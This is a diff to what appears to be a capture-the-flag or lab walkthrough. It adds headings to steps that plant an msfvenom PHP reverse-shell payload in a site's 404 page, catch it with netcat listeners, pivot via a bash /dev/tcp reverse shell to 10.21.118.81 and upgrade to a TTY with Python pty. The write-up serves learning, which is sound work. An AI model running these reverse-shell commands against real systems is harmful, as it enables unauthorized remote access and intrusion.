@@ -57,7 +57,7 @@ msfvenom -p php/reverse_php LHOST=10.21.118.81 LPORT=443 -f raw > pwned.php
 ## **the code created inside the pwned.php file will be copied into the error 404 page**
 ![image](https://github.com/user-attachments/assets/045a6510-9a06-4f5a-95e3-0fdb756f7b8b)
 
-## **we go into listening mode **
+## **we go into listening mode**
 ```bash
 nc -nlvp 443
 ```
@@ -65,6 +65,8 @@ nc -nlvp 443
 
 ## **we open a website that does not exist**
 ![image](https://github.com/user-attachments/assets/0160a91f-8439-4866-aff0-03daae79b264)
+
+## **intercept and send the connection to another port in order to establish the connection.**
 ![image](https://github.com/user-attachments/assets/b4c10518-86b2-4d94-8bce-f5186cfe7066)
 
 ```bash
@@ -72,11 +74,13 @@ bash -c "sh -i >& /dev/tcp/10.21.118.81/444 0>&1"
 ```
 ![image](https://github.com/user-attachments/assets/8f90a8bd-4599-4582-99a8-6968ea941ccf)
 
+## **we intercept the new connection on our port 444**
 ```bash
 nc -nlvp 444
 ```
 ![image](https://github.com/user-attachments/assets/0a5e6e27-269b-44ea-a313-8ea4fa2bb47b)
 
+## **once inside we do an investigation to find sensitive content and do a TTY treatment.**
 ```bash
 python -c "import pty;pty.spawn('/bin/bash')"
 ```
